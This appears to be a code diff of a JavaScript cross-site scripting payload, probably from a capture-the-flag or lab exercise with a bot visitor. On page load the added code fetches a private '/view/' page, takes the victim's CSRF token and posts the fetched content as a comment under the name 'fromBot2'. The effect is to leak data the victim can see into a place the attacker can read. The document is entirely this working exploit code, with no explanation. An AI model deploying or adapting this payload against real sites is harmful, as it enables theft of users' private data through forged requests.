@@ -1,18 +1,22 @@
-//fetch("http://127.0.0.1:9000/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
-//	return res.text();
-//}).then(data => {
 window.onload = function () {
+
+fetch("http://127.0.0.1:9000/view/3981cef4-9e4c-4cc9-bed1-3ea0f6d761a1").then((res) => {
+	return res.text();
+}).then(data => {
 	var csrf = document.querySelector("[name=csrfmiddlewaretoken]").value;
 	var formData = new FormData();
 
 	formData.append("csrfmiddlewaretoken", csrf);
 	formData.append("creator", "fromBot2");
-	formData.append("body", window.location.href);
+	formData.append("body", data);
 
-	fetch("/comment/0718f6ec-175e-448c-adfb-4c4bedfd2d0e",{
+	fetch("http://127.0.0.1:9000/comment/51673b2f-7faa-46ec-ae3b-f51d2d94e735",{
 		method: 'POST',
+		credentials: 'omit',
 		body: formData
 	});
 };
 
-//})
+});
+
+}
